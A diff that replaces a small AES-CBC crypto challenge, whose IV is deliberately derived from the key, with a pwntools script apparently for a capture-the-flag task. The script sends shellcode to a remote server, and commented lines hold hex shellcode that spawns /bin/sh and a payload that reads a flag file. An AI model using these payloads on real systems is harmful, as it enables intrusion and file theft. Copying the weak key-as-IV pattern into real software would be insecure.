@@ -1,15 +1,13 @@
-from Crypto.Util.Padding import pad, unpad
-from Crypto.Cipher import AES
-import os
+from pwn import *
 
-BLOCK_SIZE = 16
-flag = open("flag", "rb").read()
-key = os.urandom(BLOCK_SIZE)
-
-# perfecly protected!
-iv = key
-for _ in range(5):
-    iv = AES.new(key, AES.MODE_CBC, b'\x00' * 16).encrypt(iv)
-
-encrypt = lambda pt: AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pt, BLOCK_SIZE))
-decrypt = lambda ct: AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
+port = 12146
+rem = remote("srv1.kitriwhs.kr", port)
+# rem = process("./compsec/problem/deploy/prob")
+# pause()
+# payload = bytes.fromhex("48b82f62696e2f736800504889e74831f64831d2b83b0000000f0500")
+# payload = bytes.fromhex("48b82f62696e2f736800504889e731f631d2b83b0000000f05c3")
+# payload = shellcraft.openat(0, "./flag")
+# payload += shellcraft.sendfile(1, 'eax', 0, 0xff) 
+payload = shellcraft.exit(0) 
+rem.sendlineafter(b"shellcode > ", asm(payload))
+rem.interactive()
